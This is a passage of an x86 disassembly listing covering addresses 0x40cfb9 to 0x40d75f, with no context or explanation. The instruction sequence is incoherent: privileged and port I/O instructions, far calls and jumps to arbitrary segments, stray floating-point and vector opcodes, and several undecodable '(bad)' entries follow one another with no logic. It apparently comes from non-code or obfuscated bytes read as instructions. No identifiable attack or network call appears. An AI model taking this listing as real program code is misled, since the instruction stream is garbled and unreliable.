  40cfb9:	ins    DWORD PTR es:[edi],dx
  40cfba:	sub    al,0x94
  40cfbc:	repz adc BYTE PTR [eax],0x60
  40cfc0:	imul   eax,DWORD PTR [edx-0x562fcf50],0x3a
  40cfc7:	shl    esp,1
  40cfc9:	fs mov ebx,0x7e28ac6c
  40cfcf:	lahf   
  40cfd0:	mov    esi,0xe8df5b
  40cfd5:	dec    ebp
  40cfd6:	inc    ecx
  40cfd7:	sub    esi,DWORD PTR [eax-0x2e3b63e3]
  40cfdd:	sbb    al,0x90
  40cfdf:	sub    DWORD PTR [edx+eax*4+0x6c3b013c],ebp
  40cfe6:	inc    ecx
  40cfe7:	pop    ds
  40cfe8:	and    al,0x1e
  40cfea:	mov    WORD PTR [eax+eax*1],es
  40cfed:	iret   
  40cfee:	jp     0x40cffb
  40cff0:	call   0x361c:0x76120549
  40cff7:	js     0x40cfdf
  40cff9:	or     BYTE PTR [esi+0x95eaeaa],al
  40cfff:	lahf   
  40d000:	fisub  DWORD PTR [eax]
  40d002:	lock cdq 
  40d004:	cwde   
  40d005:	mov    eax,ds:0x9ab5a2a2
  40d00a:	lods   al,BYTE PTR ds:[esi]
  40d00b:	lea    edi,[edx]
  40d00d:	rol    DWORD PTR [edx*1+0x228659dc],cl
  40d014:	repz mov dh,0x4a
  40d017:	fdivr  QWORD PTR [edi-0x78]
  40d01a:	daa    
  40d01b:	add    bh,ah
  40d01d:	stos   DWORD PTR es:[edi],eax
  40d01e:	adc    al,0x6c
  40d020:	add    ch,BYTE PTR [esi-0x4327887a]
  40d026:	ret    0x667c
  40d029:	or     BYTE PTR [eax],dl
  40d02b:	add    BYTE PTR ds:0x65c24fe6,ch
  40d031:	xor    al,0xb4
  40d033:	mov    ds:0x9a9562c8,al
  40d038:	fisubr WORD PTR [esi-0x2b]
  40d03b:	inc    eax
  40d03c:	loopne 0x40d070
  40d03e:	or     BYTE PTR [esi-0x38],bh
  40d041:	add    BYTE PTR [edx-0x7f],bl
  40d044:	bound  ebp,QWORD PTR [ebx-0x53]
  40d047:	mov    ds:0x58ec101b,al
  40d04c:	pop    eax
  40d04d:	hlt    
  40d04e:	iret   
  40d04f:	jle    0x40d015
  40d051:	mov    ds:0x438ec740,al
  40d056:	xchg   esp,eax
  40d057:	aam    0x2a
  40d059:	cmp    DWORD PTR [ebx],eax
  40d05b:	push   ds
  40d05c:	push   esp
  40d05d:	stos   BYTE PTR es:[edi],al
  40d05e:	outs   dx,DWORD PTR ds:[esi]
  40d05f:	mov    al,ds:0xb7f3a029
  40d064:	or     BYTE PTR [edi],ah
  40d066:	dec    eax
  40d067:	rol    DWORD PTR [edx],1
  40d069:	rol    DWORD PTR [esi+0x5366f83c],0xcc
  40d070:	jb     0x40d05c
  40d072:	mov    dh,0xda
  40d074:	fadd   DWORD PTR [esi+0x5f9c0282]
  40d07a:	in     al,0xb6
  40d07c:	ds mov ebp,0xa65a04a
  40d082:	sub    dl,BYTE PTR [esi]
  40d084:	nop
  40d085:	pop    ebp
  40d086:	popa   
  40d087:	fs retf 
  40d089:	test   al,0x65
  40d08b:	push   esi
  40d08c:	adc    al,0x34
  40d08e:	fld    TBYTE PTR [esi+0x7a]
  40d091:	scas   eax,DWORD PTR es:[edi]
  40d092:	sbb    al,0xbe
  40d094:	mov    ebx,0xbff43618
  40d099:	jnp    0x40d06c
  40d09b:	xor    DWORD PTR [esi-0x48],0x6ed3b41a
  40d0a2:	fisubr WORD PTR [ecx+0x56a454ce]
  40d0a8:	push   ebx
  40d0a9:	xlat   BYTE PTR ds:[ebx]
  40d0aa:	xor    al,0xda
  40d0ac:	cmp    ch,BYTE PTR [eax-0x2e]
  40d0af:	data16 fisub DWORD PTR [ecx+0x5a]
  40d0b3:	sbb    bh,BYTE PTR [eax-0x4abdb96b]
  40d0b9:	add    DWORD PTR [esi-0x4a2a2ed8],esp
  40d0bf:	mov    ch,0x2f
  40d0c1:	jbe    0x40d094
  40d0c3:	(bad)  
  40d0c4:	and    bl,BYTE PTR [edi]
  40d0c6:	sbb    ch,BYTE PTR [eax-0x7f078856]
  40d0cc:	push   esp
  40d0cd:	push   eax
  40d0ce:	hlt    
  40d0cf:	cdq    
  40d0d0:	jb     0x40d0dd
  40d0d2:	pop    edx
  40d0d3:	ins    DWORD PTR es:[edi],dx
  40d0d4:	or     al,0x6d
  40d0d6:	xchg   edi,eax
  40d0d7:	sub    eax,0x4acac1e
  40d0dc:	enter  0xaa33,0x7c
  40d0e0:	loopne 0x40d074
  40d0e2:	cmp    cl,BYTE PTR [edx]
  40d0e4:	mov    ch,BYTE PTR [edx]
  40d0e6:	dec    esp
  40d0e7:	imul   ecx,eax,0x966730db
  40d0ed:	out    0x2a,eax
  40d0ef:	sub    dl,BYTE PTR [ebx+ecx*1]
  40d0f2:	sbb    BYTE PTR [esi+eiz*1-0x4dc3d7a8],dl
  40d0f9:	adc    al,0xba
  40d0fb:	dec    esp
  40d0fc:	inc    ebp
  40d0fd:	mov    esi,DWORD PTR [eax+0x76ed8cd]
  40d103:	and    dh,dl
  40d105:	adc    DWORD PTR [esi],0x34d68ad8
  40d10b:	fidiv  WORD PTR [esi-0x1d]
  40d10e:	mov    eax,0x8aeeabc0
  40d113:	push   0xae556e39
  40d118:	int    0x1c
  40d11a:	mov    al,ds:0x12e0e5be
  40d11f:	cmp    DWORD PTR [esi+ebx*8+0x22],0x0
  40d124:	pop    ebp
  40d125:	dec    ebp
  40d126:	xchg   ebp,eax
  40d127:	xor    bh,BYTE PTR [esi-0x4feca1b5]
  40d12d:	jnp    0x40d144
  40d12f:	inc    ebp
  40d130:	adc    eax,0xdc95ea05
  40d135:	xchg   DWORD PTR [edx+0x30],edi
  40d138:	dec    esp
  40d139:	cmp    dl,BYTE PTR [ebx]
  40d13b:	lods   eax,DWORD PTR ds:[esi]
  40d13c:	test   al,0xb0
  40d13e:	test   BYTE PTR [esp+eax*1+0x694e1cd1],dl
  40d145:	xor    cl,BYTE PTR [esi+0x6caad0df]
  40d14b:	cmp    ch,BYTE PTR [ebx+0x4c]
  40d14e:	sbb    BYTE PTR [edi],bl
  40d150:	les    esi,FWORD PTR [eax+0xe97ab6]
  40d156:	lds    edx,FWORD PTR ds:0x682f3581
  40d15c:	mov    eax,0x4f6697
  40d161:	dec    ecx
  40d162:	frstor [esi+ebp*1+0xd6ae818]
  40d169:	jg     0x40d18b
  40d16b:	jno    0x40d16d
  40d16d:	hlt    
  40d16e:	mov    ebx,0x11a5200
  40d173:	out    dx,al
  40d174:	cmp    DWORD PTR [esi+0x60122884],ebx
  40d17a:	stos   DWORD PTR es:[edi],eax
  40d17b:	mov    BYTE PTR [esp+eiz*2+0x325258a4],ch
  40d182:	adc    BYTE PTR [edi-0x14],0xea
  40d186:	jmp    0x3dbc:0xaf329e00
  40d18d:	xchg   esp,eax
  40d18e:	push   ss
  40d18f:	mov    al,ds:0x4d4d1100
  40d194:	push   es
  40d195:	xor    eax,0xee9a1aaa
  40d19a:	and    dl,BYTE PTR ds:0xaa45150d
  40d1a0:	mov    esi,0x1ca92c6c
  40d1a5:	ins    DWORD PTR es:[edi],dx
  40d1a6:	stos   BYTE PTR es:[edi],al
  40d1a7:	sbb    ah,BYTE PTR [eax-0x15]
  40d1aa:	mov    al,0x8a
  40d1ac:	das    
  40d1ad:	fdiv   QWORD PTR [edx]
  40d1af:	call   0x51d3:0xad041bea
  40d1b6:	inc    ebx
  40d1b7:	adc    DWORD PTR ds:0xcc0a285e,0xe09d6e7e
  40d1c1:	push   cs
  40d1c2:	sbb    ebp,DWORD PTR [ecx+eiz*2+0x7302ed07]
  40d1c9:	inc    esi
  40d1ca:	mov    al,0xe2
  40d1cc:	inc    ebp
  40d1cd:	sub    eax,0xd47d8341
  40d1d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1d3:	arpl   si,ax
  40d1d5:	aad    0xe2
  40d1d7:	xor    al,0xe0
  40d1d9:	mov    esp,0x1435a06
  40d1de:	ins    BYTE PTR es:[edi],dx
  40d1df:	mov    ecx,0xa25e4cef
  40d1e4:	push   eax
  40d1e5:	add    edi,DWORD PTR [edi+ebp*2+0x7]
  40d1e9:	loope  0x40d216
  40d1eb:	call   0xa6:0x52702a2e
  40d1f2:	inc    edx
  40d1f3:	mov    esp,0xa8aaac0
  40d1f8:	adc    eax,eax
  40d1fa:	push   ds
  40d1fb:	mov    ds:0x9ad19cf6,al
  40d200:	push   es
  40d201:	shr    DWORD PTR [eax],1
  40d203:	fidivr WORD PTR [eax]
  40d205:	sbb    dh,ah
  40d207:	lock jo 0x40d198
  40d20a:	fcom   DWORD PTR [ecx+0x50]
  40d20d:	aam    0x4e
  40d20f:	aas    
  40d210:	add    ah,BYTE PTR [ebp-0x6b09d334]
  40d216:	aas    
  40d217:	sub    BYTE PTR [edx],0xd5
  40d21a:	es inc edx
  40d21c:	fs xchg ebp,eax
  40d21e:	mov    ecx,0xa8fa9cc0
  40d223:	(bad)  
  40d225:	mov    es,WORD PTR [edx+0x3cd3f07b]
  40d22b:	jbe    0x40d29a
  40d22d:	hlt    
  40d22e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d22f:	fcomp  QWORD PTR [edx+0x0]
  40d232:	and    eax,0xd4d0005b
  40d237:	sbb    bl,BYTE PTR [edx-0x25c7a550]
  40d23d:	dec    esp
  40d23e:	sub    DWORD PTR [esi],ebp
  40d240:	push   edi
  40d241:	mov    BYTE PTR [eax+0x5c8a568a],al
  40d247:	pop    eax
  40d248:	and    edx,DWORD PTR [edx-0x80]
  40d24b:	out    dx,al
  40d24c:	mov    eax,ds:0x143475a0
  40d251:	fdivrp st(0),st
  40d253:	mov    ebx,0x8242ad58
  40d258:	or     al,0x14
  40d25a:	dec    ecx
  40d25b:	mov    al,0xbc
  40d25d:	mov    edi,0x87f22a1b
  40d262:	lods   eax,DWORD PTR ds:[esi]
  40d263:	mov    al,ds:0xf6a46b15
  40d268:	int    0xee
  40d26a:	jo     0x40d232
  40d26c:	or     DWORD PTR [edx],ecx
  40d26e:	mov    bl,0xd
  40d270:	add    eax,0xcf1d6
  40d275:	xchg   edx,eax
  40d276:	lods   eax,DWORD PTR ds:[esi]
  40d277:	pop    edx
  40d278:	scas   al,BYTE PTR es:[edi]
  40d279:	push   0xffffff9c
  40d27b:	dec    eax
  40d27c:	add    al,BYTE PTR [ecx+0x5b452e8]
  40d282:	mov    BYTE PTR [ebp-0x3],0x7c
  40d286:	lea    ebx,[esi+0x5c]
  40d289:	ja     0x40d2ef
  40d28b:	ins    DWORD PTR es:[edi],dx
  40d28c:	test   ebp,ebp
  40d28e:	add    BYTE PTR [edi],dh
  40d290:	mov    dh,0xb8
  40d292:	fs icebp 
  40d294:	ds jbe 0x40d271
  40d297:	mov    eax,0xd5d68e81
  40d29c:	or     bh,BYTE PTR [edx+0x38]
  40d29f:	shl    BYTE PTR [edx],1
  40d2a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2a2:	ss stc 
  40d2a4:	test   eax,0x603ac0a9
  40d2a9:	add    ebp,DWORD PTR [eax]
  40d2ab:	mov    edx,0x6c5db205
  40d2b0:	mov    bl,0xb6
  40d2b2:	mov    ds:0x7da6ccf4,al
  40d2b7:	push   0xfae2509a
  40d2bc:	cmp    al,0x4f
  40d2be:	mov    esi,0xd55852f5
  40d2c3:	xor    BYTE PTR [edi],0x84
  40d2c6:	dec    edi
  40d2c7:	ds or  al,0xbd
  40d2ca:	mov    dl,0xaa
  40d2cc:	pop    si
  40d2ce:	rol    BYTE PTR [esi+0x415a42],1
  40d2d4:	loopne 0x40d2d6
  40d2d6:	inc    esi
  40d2d7:	ret    
  40d2d8:	push   es
  40d2d9:	jne    0x40d290
  40d2db:	mov    cl,BYTE PTR [esi+0x709d4275]
  40d2e1:	in     eax,0x16
  40d2e3:	push   edi
  40d2e4:	add    dl,BYTE PTR [edx-0x7e]
  40d2e7:	push   edi
  40d2e8:	xor    al,0x34
  40d2ea:	inc    eax
  40d2eb:	mov    esp,0x2fd0c57a
  40d2f0:	test   eax,0x43f03500
  40d2f5:	rol    DWORD PTR [esi-0x37e1b856],0x92
  40d2fc:	mov    ds:0x8c82434,eax
  40d301:	ss pop ecx
  40d303:	rol    DWORD PTR [edx],0x66
  40d306:	fdivr  QWORD PTR [ecx+0x12]
  40d309:	xor    dl,dh
  40d30b:	dec    esp
  40d30c:	mov    ch,0x82
  40d30e:	inc    esp
  40d30f:	mov    ah,0xa
  40d311:	imul   esi,eax,0xffffffca
  40d314:	cs pop ds
  40d316:	pop    eax
  40d317:	sbb    BYTE PTR [eax+eiz*4-0x1db3bd5e],dh
  40d31e:	shr    DWORD PTR [esi],cl
  40d320:	sub    eax,DWORD PTR [edx-0x2a]
  40d323:	mov    edi,0x4aaa5430
  40d328:	dec    edx
  40d329:	mov    ds:0x1ab5c226,al
  40d32e:	push   edi
  40d32f:	xchg   ebx,eax
  40d330:	push   0x8863da6b
  40d335:	imul   edi,DWORD PTR [ebx],0xe
  40d338:	cmp    bl,BYTE PTR [ebx+0x7a]
  40d33b:	popa   
  40d33c:	push   0x43
  40d33e:	push   ecx
  40d33f:	leave  
  40d340:	and    BYTE PTR [edi+0x3e],ah
  40d343:	xchg   ebp,eax
  40d344:	rcl    cl,0x62
  40d347:	add    DWORD PTR [ecx-0x66],0xe2274898
  40d34e:	out    dx,eax
  40d34f:	jg     0x40d322
  40d351:	pop    esi
  40d352:	push   eax
  40d353:	push   ebp
  40d354:	cmp    al,BYTE PTR [ecx-0x6b6955be]
  40d35a:	js     0x40d35c
  40d35c:	call   0x82cb0207
  40d361:	add    bl,bl
  40d363:	test   dl,ah
  40d365:	(bad)  
  40d366:	sub    BYTE PTR [edx+0x3a9700de],ah
  40d36c:	push   es
  40d36d:	mov    esp,0x2e1a443
  40d372:	xchg   bx,ax
  40d374:	jo     0x40d376
  40d376:	jb     0x40d3f0
  40d378:	adc    eax,0x1c151505
  40d37d:	jmp    0x694d8bce
  40d382:	or     bl,BYTE PTR [ebp+0x15820545]
  40d388:	cs icebp 
  40d38a:	mov    ah,0x1e
  40d38c:	mov    bh,al
  40d38e:	xor    bh,BYTE PTR [ecx]
  40d390:	ins    BYTE PTR es:[edi],dx
  40d391:	xor    al,0x61
  40d393:	dec    ebp
  40d394:	jo     0x40d34b
  40d396:	inc    eax
  40d397:	repnz and al,0x7b
  40d39a:	cwde   
  40d39b:	mul    al
  40d39d:	inc    ecx
  40d39e:	js     0x40d348
  40d3a0:	nop
  40d3a1:	push   ds
  40d3a2:	push   ss
  40d3a3:	shl    BYTE PTR [esi-0x7fca5220],0x19
  40d3aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3ab:	sbb    al,0x58
  40d3ad:	ins    DWORD PTR es:[edi],dx
  40d3ae:	xchg   esi,eax
  40d3af:	add    BYTE PTR [eax+0x24],al
  40d3b2:	pop    es
  40d3b3:	push   es
  40d3b4:	inc    ecx
  40d3b5:	aam    0xda
  40d3b7:	scas   al,BYTE PTR es:[edi]
  40d3b8:	xor    dh,BYTE PTR [eax+0x4c]
  40d3bb:	mov    dl,0x9e
  40d3bd:	push   cs
  40d3be:	test   BYTE PTR ds:0xd8056aa8,al
  40d3c4:	je     0x40d39c
  40d3c6:	hlt    
  40d3c7:	push   ds
  40d3c8:	mov    edx,0x28dcd894
  40d3cd:	mov    al,0xaa
  40d3cf:	push   ebp
  40d3d0:	test   BYTE PTR ds:0x941a3cfa,al
  40d3d6:	fimul  DWORD PTR [edx+0x559a9ad6]
  40d3dc:	cli    
  40d3dd:	into   
  40d3de:	inc    esi
  40d3df:	sub    BYTE PTR [esi+esi*8-0x34c5f54b],0x16
  40d3e7:	xor    eax,0xbd0ade39
  40d3ec:	clc    
  40d3ed:	or     bl,ah
  40d3ef:	jbe    0x40d39b
  40d3f1:	stos   DWORD PTR es:[edi],eax
  40d3f2:	adc    dl,BYTE PTR [esi+edi*8+0x674ab302]
  40d3f9:	lods   eax,DWORD PTR ds:[esi]
  40d3fa:	rol    DWORD PTR [eax],0xa2
  40d3fd:	nop
  40d3fe:	aam    0xf6
  40d400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d402:	mov    BYTE PTR [esi+0x70],dh
  40d405:	or     DWORD PTR [ebp+0x4d],ecx
  40d408:	cmp    ah,BYTE PTR [ebp+0x70]
  40d40b:	ret    0xc460
  40d40e:	out    0x2f,al
  40d410:	test   al,0xfa
  40d412:	jmp    0x40d3e0
  40d414:	mov    dh,0x6c
  40d416:	add    BYTE PTR [esi],cl
  40d418:	dec    ebp
  40d419:	add    BYTE PTR [ecx+0x28],cl
  40d41c:	xlat   BYTE PTR ds:[ebx]
  40d41d:	xchg   BYTE PTR [ebp-0x6f],cl
  40d420:	mov    ebp,0x6aa81d00
  40d425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d426:	jbe    0x40d416
  40d428:	jbe    0x40d45c
  40d42a:	call   0xdff5485f
  40d42f:	and    al,bl
  40d431:	mov    ah,0x92
  40d433:	jp     0x40d46b
  40d435:	pop    ebx
  40d436:	scas   eax,DWORD PTR es:[edi]
  40d437:	jmp    0x8c49:0x640ad10
  40d43e:	(bad)  
  40d43f:	xchg   esp,eax
  40d440:	pop    edx
  40d441:	xor    eax,0xc1ef001c
  40d446:	sub    edi,DWORD PTR [esi-0x4cb4080]
  40d44c:	cs cmp ch,al
  40d44f:	add    ah,bh
  40d451:	scas   al,BYTE PTR es:[edi]
  40d452:	ss xor eax,0x3408633c
  40d458:	mov    ds:0xfa1abcd8,al
  40d45d:	mov    dx,0xe86b
  40d461:	mov    al,0xcd
  40d463:	push   0xffffffd0
  40d465:	stos   BYTE PTR es:[edi],al
  40d466:	adc    BYTE PTR [esp+ecx*1-0x5f1a7953],0x44
  40d46e:	inc    edi
  40d46f:	inc    ebx
  40d470:	inc    edi
  40d471:	aas    
  40d472:	push   esp
  40d473:	xlat   BYTE PTR ds:[ebx]
  40d474:	jp     0x40d4ed
  40d476:	js     0x40d432
  40d478:	sbb    ch,BYTE PTR [edx]
  40d47a:	adc    al,0x45
  40d47c:	xchg   edx,eax
  40d47d:	add    al,0x40
  40d47f:	mov    esi,0xe1e72c8b
  40d484:	push   0x6f120b6a
  40d489:	sbb    DWORD PTR [edx],edi
  40d48b:	pusha  
  40d48c:	mov    fs:0x2d9a800,al
  40d492:	pop    ebx
  40d493:	dec    esp
  40d494:	push   0x37
  40d496:	cmp    BYTE PTR [eax+0x9],0x56
  40d49a:	or     dl,BYTE PTR [edx+0x39]
  40d49d:	lods   eax,DWORD PTR ds:[esi]
  40d49e:	mov    ds:0xf162a0a1,al
  40d4a3:	dec    eax
  40d4a4:	out    dx,al
  40d4a5:	sahf   
  40d4a6:	dec    ebp
  40d4a7:	inc    eax
  40d4a8:	mov    bh,0xee
  40d4aa:	adc    esp,DWORD PTR [eax]
  40d4ac:	adc    al,0xd
  40d4ae:	sub    ah,0xd8
  40d4b1:	push   0x859eca79
  40d4b6:	mov    ds,WORD PTR ds:0x60062f7c
  40d4bc:	sub    cl,BYTE PTR cs:[edx+eax*4+0x4e3b66a2]
  40d4c4:	and    DWORD PTR [ecx+0x6225b8ca],esp
  40d4ca:	lahf   
  40d4cb:	xor    BYTE PTR [edx],cl
  40d4cd:	call   0x8d00:0xf945f8a6
  40d4d4:	cmp    DWORD PTR [eax+0x663ea7c4],0xffffffdb
  40d4db:	push   ss
  40d4dc:	sbb    bh,BYTE PTR [edx]
  40d4de:	or     bh,BYTE PTR [eax-0x44]
  40d4e1:	int3   
  40d4e2:	sub    BYTE PTR [eax+edx*1+0x286883ea],cl
  40d4e9:	jbe    0x40d54c
  40d4eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4ec:	sub    BYTE PTR [eax-0x4f],bh
  40d4ef:	inc    ebx
  40d4f0:	jnp    0x40d49e
  40d4f2:	lods   eax,DWORD PTR ds:[esi]
  40d4f3:	adc    dl,BYTE PTR [edx+0x6693d182]
  40d4f9:	jno    0x40d530
  40d4fb:	lods   al,BYTE PTR ds:[esi]
  40d4fc:	fnstsw ax
  40d4fe:	inc    ebp
  40d4ff:	imul   esp,esi,0x7f
  40d502:	cmc    
  40d503:	add    ah,dh
  40d505:	sub    al,0x0
  40d507:	fs jo  0x40d50a
  40d50a:	push   edi
  40d50b:	mov    al,0x10
  40d50d:	cli    
  40d50e:	dec    esp
  40d50f:	mov    ecx,0x6caa2abe
  40d514:	inc    ecx
  40d515:	iret   
  40d516:	jle    0x40d595
  40d518:	in     eax,dx
  40d519:	jl     0x40d4f3
  40d51b:	jp     0x40d4ed
  40d51d:	add    eax,ebx
  40d51f:	inc    esp
  40d520:	sbb    ebp,DWORD PTR [edx-0x48436abe]
  40d526:	icebp  
  40d527:	and    BYTE PTR [esi],ch
  40d529:	mov    ebx,0xe0b151b3
  40d52e:	nop
  40d52f:	push   ss
  40d530:	fidiv  DWORD PTR [edx+0x43]
  40d533:	mov    ds:0x48a9184c,eax
  40d538:	mov    ah,0xc8
  40d53a:	fidiv  WORD PTR [eax-0x7991cc3e]
  40d540:	js     0x40d4f3
  40d542:	mov    al,ds:0xced0a2a9
  40d547:	mov    DWORD PTR cs:[eax-0x74c71514],edi
  40d54e:	pinsrw mm4,WORD PTR [esi-0x61],0x36
  40d553:	or     dl,bh
  40d555:	sub    al,ch
  40d557:	daa    
  40d558:	mov    dl,0x2
  40d55a:	repz jmp 0x40d58f
  40d55d:	mov    ah,0x45
  40d55f:	dec    edx
  40d560:	lea    eax,[edi-0x6]
  40d563:	iret   
  40d564:	xchg   BYTE PTR [eax-0x42],ch
  40d567:	and    al,BYTE PTR [edx]
  40d569:	mov    dh,0x82
  40d56b:	xor    BYTE PTR [eax],0xa9
  40d56e:	add    BYTE PTR [ebx+0x10],ah
  40d571:	xor    ebp,DWORD PTR [esi+eax*4]
  40d574:	inc    edi
  40d575:	lods   eax,DWORD PTR ds:[esi]
  40d576:	cmp    dh,ch
  40d578:	(bad)  
  40d579:	cli    
  40d57a:	ins    DWORD PTR es:[edi],dx
  40d57b:	xor    eax,0x1a9e91d8
  40d580:	push   ss
  40d581:	xor    al,0xc0
  40d583:	cwde   
  40d584:	adc    bh,0xf5
  40d587:	test   BYTE PTR [ecx+0x56fada57],bh
  40d58d:	adc    al,0x74
  40d58f:	cmp    DWORD PTR [esp+ebp*1+0x59],ebp
  40d593:	xchg   esi,eax
  40d594:	mov    edi,0x2efc0176
  40d599:	mov    ch,0xca
  40d59b:	aad    0x4c
  40d59d:	call   0x2c5fe1b0
  40d5a2:	outs   dx,BYTE PTR ds:[esi]
  40d5a3:	push   ss
  40d5a4:	mov    dl,0xe6
  40d5a6:	or     eax,0x176f349b
  40d5ab:	out    0x65,al
  40d5ad:	add    BYTE PTR ds:0x60405d0c,cl
  40d5b3:	push   ebx
  40d5b4:	jmp    0x40d5de
  40d5b6:	push   esi
  40d5b7:	add    ebx,DWORD PTR [eax]
  40d5b9:	vpermt2b zmm5,zmm1,DWORD PTR [edi+0x2c3e9b44]{1to16}
  40d5c3:	xchg   esp,eax
  40d5c4:	inc    ecx
  40d5c5:	(bad)  
  40d5c6:	fidivr DWORD PTR [ebx+0x14ab1002]
  40d5cc:	mov    ebx,0xf459ec5c
  40d5d1:	scas   al,BYTE PTR es:[edi]
  40d5d2:	sbb    eax,0x83b0436f
  40d5d7:	sbb    BYTE PTR [edx],dl
  40d5d9:	cmp    al,0x37
  40d5db:	retf   
  40d5dc:	or     al,0xd
  40d5de:	mov    dh,0xa3
  40d5e0:	mov    al,ds:0xc18a5cc
  40d5e5:	scas   al,BYTE PTR es:[edi]
  40d5e6:	mov    bh,0x1f
  40d5e8:	mov    eax,0x55a41e62
  40d5ed:	add    eax,0xb42f0005
  40d5f2:	stos   DWORD PTR es:[edi],eax
  40d5f3:	pushf  
  40d5f4:	xor    eax,0xeb02f0f
  40d5f9:	mov    bh,0x12
  40d5fb:	mov    edx,0x1c001c03
  40d600:	add    al,0x0
  40d602:	xlat   BYTE PTR ds:[ebx]
  40d603:	mov    ds:0x1fe686a2,al
  40d608:	add    BYTE PTR [ebp-0x5e],dh
  40d60b:	push   cs
  40d60c:	sub    edx,DWORD PTR [eax+0x20]
  40d60f:	and    BYTE PTR [esi],dh
  40d611:	adc    al,0x28
  40d613:	mov    dh,0x3f
  40d615:	mov    dh,ah
  40d617:	push   ss
  40d618:	and    dh,al
  40d61a:	loope  0x40d678
  40d61c:	lahf   
  40d61d:	and    dl,BYTE PTR [ebp+esi*1+0x54]
  40d621:	or     BYTE PTR [eax],dh
  40d623:	loop   0x40d5f3
  40d625:	push   eax
  40d626:	or     eax,DWORD PTR [eax]
  40d628:	mov    edx,0x35a3b6aa
  40d62d:	adc    DWORD PTR es:[ecx+ebp*8+0x64995f36],0x456dc625
  40d639:	add    eax,0xf6bc8a1d
  40d63e:	psubb  mm4,mm3
  40d641:	add    al,0xc0
  40d643:	or     BYTE PTR [ebp+0x3a5c3],bh
  40d649:	fidivr WORD PTR [esi]
  40d64b:	nop
  40d64c:	dec    ebx
  40d64d:	pop    esi
  40d64e:	add    BYTE PTR [esi+esi*4-0x1dcacb8b],dh
  40d655:	imul   esi
  40d657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d658:	and    al,0x25
  40d65a:	add    al,0x7c
  40d65c:	xor    ecx,DWORD PTR [eax+0x55b0ea28]
  40d662:	nop
  40d663:	pop    ds
  40d664:	dec    ebx
  40d665:	cli    
  40d666:	sub    bh,BYTE PTR [ecx-0x57784a92]
  40d66c:	add    ch,BYTE PTR [eax+0x50]
  40d66f:	gs and al,0xfb
  40d672:	or     BYTE PTR [eax+0x62],bh
  40d675:	xchg   ecx,eax
  40d676:	push   0x51
  40d678:	xchg   ecx,eax
  40d679:	and    BYTE PTR [edx-0x17],dl
  40d67c:	pusha  
  40d67d:	mov    esp,0xc10afeda
  40d682:	xchg   BYTE PTR [ebx],cl
  40d684:	mov    bl,ah
  40d686:	cmp    BYTE PTR [edx],al
  40d688:	xchg   esp,eax
  40d689:	lock or dl,BYTE PTR ds:0x57b6c2ad
  40d690:	sbb    BYTE PTR [eax],0x85
  40d693:	mov    dl,0x76
  40d695:	push   esi
  40d696:	pop    esi
  40d697:	or     al,0xa0
  40d699:	xchg   ebp,eax
  40d69a:	pop    edx
  40d69b:	sub    esi,DWORD PTR [eax+0x2]
  40d69e:	push   esp
  40d69f:	sar    bl,cl
  40d6a1:	pop    eax
  40d6a2:	inc    ebp
  40d6a3:	mov    ss,ebx
  40d6a5:	rcl    cl,1
  40d6a7:	pusha  
  40d6a8:	sbb    ebp,DWORD PTR [ebp*8-0x18c1655e]
  40d6af:	pop    edx
  40d6b0:	and    dl,BYTE PTR ds:0xba5b02b4
  40d6b6:	add    esi,DWORD PTR [edi+0x46f27252]
  40d6bc:	jnp    0x40d6b4
  40d6be:	sar    DWORD PTR [ecx],1
  40d6c0:	stos   BYTE PTR es:[edi],al
  40d6c1:	ss xor al,0x10
  40d6c4:	dec    esi
  40d6c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6c6:	push   0x66
  40d6c8:	xchg   esi,eax
  40d6c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6ca:	push   es
  40d6cb:	xchg   esi,eax
  40d6cc:	add    BYTE PTR ds:0x57170b6,0xd6
  40d6d3:	xchg   esi,eax
  40d6d4:	sbb    al,ah
  40d6d6:	mov    ebx,0x94205f9a
  40d6db:	test   al,0xa8
  40d6dd:	add    BYTE PTR ds:0x82840014,bl
  40d6e3:	pop    esp
  40d6e4:	mov    edx,0x5ad49938
  40d6e9:	mov    DWORD PTR [eax],0x10a512df
  40d6ef:	or     eax,0x15647d0a
  40d6f4:	(bad)  
  40d6f5:	mov    cl,0xa2
  40d6f7:	sub    dl,dl
  40d6f9:	add    al,0xe6
  40d6fb:	aas    
  40d6fc:	(bad)  
  40d6fd:	fist   DWORD PTR [eax]
  40d6ff:	sub    BYTE PTR [ebp+0x15],cl
  40d702:	add    eax,0x30c0056f
  40d707:	out    dx,al
  40d708:	aaa    
  40d709:	int    0x0
  40d70b:	push   eax
  40d70c:	(bad)  
  40d70d:	jmp    0x1d05:0xad742fca
  40d714:	in     al,0xc0
  40d716:	scas   al,BYTE PTR es:[edi]
  40d717:	fmul   DWORD PTR [eax+0x5b06bb04]
  40d71d:	push   esp
  40d71e:	push   esp
  40d71f:	xor    cl,BYTE PTR [ecx]
  40d721:	sub    al,0x6b
  40d723:	clc    
  40d724:	pop    eax
  40d725:	out    0xdc,al
  40d727:	cmp    cl,al
  40d729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d72a:	inc    edx
  40d72b:	sbb    DWORD PTR [eax+0x44],ebp
  40d72e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d72f:	in     al,0x9f
  40d731:	ss push esp
  40d733:	jne    0x40d6e9
  40d735:	add    dh,BYTE PTR [eax]
  40d737:	sub    DWORD PTR [esi-0x45777b88],edi
  40d73d:	jle    0x40d7a7
  40d73f:	push   cs
  40d740:	adc    eax,0xc2aafa55
  40d745:	es mov al,ss:0x5a2abad6
  40d74c:	sub    ecx,DWORD PTR [esi-0x38]
  40d74f:	inc    eax
  40d750:	xchg   edi,eax
  40d751:	fmul   QWORD PTR ds:0x8a1abca6
  40d757:	inc    edx
  40d758:	fist   DWORD PTR [eax+eiz*1]
  40d75b:	scas   al,BYTE PTR es:[edi]
  40d75c:	and    al,0xea
  40d75f:	call   0x8a3a:0xec142d61
